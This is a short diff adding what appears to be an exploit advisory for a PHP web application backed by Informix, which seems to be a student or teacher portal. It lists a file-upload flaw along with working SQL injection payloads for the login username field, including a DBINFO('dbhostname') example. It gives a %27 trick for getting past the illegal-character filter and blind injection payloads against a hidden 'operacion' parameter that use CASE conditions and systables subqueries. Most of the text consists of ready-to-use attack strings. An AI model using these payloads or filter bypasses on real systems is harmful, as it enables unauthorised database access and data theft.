@@ -1,0 +1,40 @@
+file upload
+^^^^^^^^^^^
+given a valid phpsessid, you can upload files to the server. this bug is fixed in some versions.
+http://www.example.com/a_docentes/subirArchivo.php
+
+sql injection
+^^^^^^^^^^^^^
+http://www.example.com/w_inicial.php
+OR 
+http://www.example.com/inicial.php
+
+Username (Identificacion): ' || (SQL Statement) || '
+Password (Clave): **** (anything)
+
+example:
+Username (Identificacion): ' || DBINFO('dbhostname') || '	
+Password (Clave): **** (anything)
+
+just remember they are using Informix!
+sql injection is partialy solved in some places.
+
+in order to fool some protections, such as "[Informix]An illegal character has been found in the statement.", you can use %27 instead of '.
+
+blind sql injection
+^^^^^^^^^^^^^^^^^^^
+hidden parameter "operacion" in:
+
+http://www.example.com/a_general/verMensajes.php
+http://www.example.com/a_general/autentificarse.php
+
+... and probably more!
+
+example (via POST): http://www.example.com/a_general/verMensajes.php?operacion=op0001' || (case when 10<1 then '1' else '2' end) || '
+
+another example (in autentificarse.php):
+
+operacion=op0001' || (SELECT '1' FROM systables where tabid = 1) || '  
+(no error, because it returns a single value)
+operacion=op0001' || (SELECT '1' FROM systables where tabid <> 1) || ' 
+(error, because there are multiple results)
